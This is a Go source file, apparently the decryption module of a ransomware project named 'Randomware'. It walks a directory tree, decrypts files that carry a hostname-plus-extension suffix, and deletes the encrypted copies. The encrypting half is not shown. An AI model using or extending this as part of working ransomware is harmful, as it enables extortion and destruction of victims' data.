package file

import (
	"Randomware/encryption"
	"os"
	"strings"
	"sync"
)

// Decrypt : decrypts file with key
func Decrypt(fileSrc string, key *[]byte) (string, error) {

	decryptedFileName := fileSrc[0 : len(fileSrc)-(len(EncryptedExt)+len(HostName))]
	encryptedFile, err := os.Open(fileSrc)

	counter := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}

	if err != nil {
		return "", err
	}

	fi, err := encryptedFile.Stat()

	if err != nil {
		return "", err
	}

	//Reads Data from file
	var i int64
	data := make([]byte, MaxSize)
	iterations := fi.Size() / int64(MaxSize)

	//Creates decrypted File
	decryptedFile, err := os.Create(decryptedFileName)

	if err != nil {
		return "", err
	}

	defer decryptedFile.Close()

	//Decrypts chunks of MaxSize data to encrypted file
	for i = 0; i < iterations; i++ {
		encryptedFile.Read(data)
		encryption.Decrypt(&data, key, &counter)
		_, err = decryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		decryptedFile.Sync()
	}

	//Decrypts remaining of file (less then MaxSize)
	if fi.Size()%int64(MaxSize) != 0 {
		data = make([]byte, fi.Size()-iterations*int64(MaxSize))
		encryptedFile.Read(data)
		encryption.Decrypt(&data, key, &counter)
		_, err = decryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		decryptedFile.Sync()
	}

	encryptedFile.Close()

	os.Remove(fileSrc)

	return decryptedFileName, nil
}

// DecryptAll : encrypts all files from root directory and all subdirectories
func DecryptAll(rootFolder string, key *[]byte) (uint64, error) {

	var wg sync.WaitGroup
	var mutex = &sync.Mutex{}
	var decryptedFilesNbr uint64 = 0
	xthreads := MaxThreads

	files, err := DiscoverFiles(rootFolder)
	if err != nil {
		return decryptedFilesNbr, err
	}
	filesNbr := uint64(len(files))
	ch := make(chan string, filesNbr) // This number can be anything as long as it's larger than xthreads

	// This starts xthreads number of goroutines that wait for something to do
	if uint64(xthreads) > filesNbr {
		xthreads = int(filesNbr)
	}
	wg.Add(xthreads)
	for i := 0; i < xthreads; i++ {
		go func() {
			for {
				file, ok := <-ch
				if !ok { // if there is nothing to do and the channel has been closed then end the goroutine
					wg.Done()
					return
				}
				if strings.Contains(file, HostName+EncryptedExt) {
					_, err := Decrypt(file, key)
					if err == nil {
						mutex.Lock()
						decryptedFilesNbr++
						mutex.Unlock()
					}
				}
			}
		}()
	}

	// Now the jobs can be added to the channel, which is used as a queue
	for _, file := range files {
		ch <- file // add i to the queue
	}

	close(ch) // This tells the goroutines there's nothing else to do
	wg.Wait() // Wait for the threads to finish
	return decryptedFilesNbr, nil
}
